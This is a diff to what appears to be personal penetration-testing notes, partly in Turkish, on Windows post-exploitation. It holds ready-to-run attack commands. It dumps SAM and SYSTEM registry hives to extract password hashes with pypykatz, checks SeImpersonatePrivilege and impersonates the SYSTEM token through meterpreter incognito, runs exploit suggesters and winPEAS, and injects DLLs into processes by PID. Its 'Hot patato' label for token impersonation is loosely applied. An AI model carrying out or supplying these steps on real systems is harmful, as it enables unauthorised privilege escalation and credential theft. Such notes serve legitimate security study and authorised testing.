@@ -158,3 +158,32 @@ reg save hklm\system c:\temp\system.hive
 
 download sam and system file attack machine
 kali : pypykatz registry --sam sam.hive system.hive
+-----------------------------------
+get system : UAC yoksa yetki yükseltir - Not kullanıcı admin grubunda olmalıdır.
+-----------------------------------
+Hot patato attack priv:
+whoami /priv :
+        SeImpersonatePrivilege Enabled #eğer Tekrarlama aktifse yapılacaklar aşağıdaki gibidir.
+meterpreter > load incognito
+meterpreter > list_tokens -u 
+meterpreter > impersonate_token "NT AUTHORİTY\SYSTEM"
+-----------------------------------
+# Tools
+run post/multi/recon/local_exploit_suggester : exploit scanner
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester :
+    $ ./windows-exploit-suggester.py --update
+    $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
+
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+https://securityxploded.com/remote-dll-injector.php :
+        RemoteDLLInjector.exe -h
+ 
+        //Inject DLL into 32-bit process with pid 1551
+        RemoteDLLInjector32.exe 1551 "c:\my project\inject32.dll"
+ 
+        //Inject DLL into 64-bit process with pid 1001
+        RemoteDLLInjector64.exe 1001 "c:\inject64.dll"
+        
+        
+        
+        
